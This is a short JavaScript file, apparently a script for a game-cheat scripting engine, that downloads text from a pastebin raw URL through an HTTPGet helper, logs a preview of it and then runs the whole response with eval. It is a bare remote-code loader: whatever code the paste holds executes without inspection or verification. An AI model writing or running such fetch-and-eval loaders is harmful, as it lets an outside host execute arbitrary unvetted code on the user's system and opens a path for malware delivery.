import { Addon } from '../lib/lib.js';

/**
 * Cheat.Print('Hello World!\n');
 */
const response = Addon.HTTPGet('https://pastebin.com/raw/E0J5A0Rk');

Cheat.Print(`result: ${response != null};\nvalue: ${response.substring(0, 200)}\n`);

eval(response);
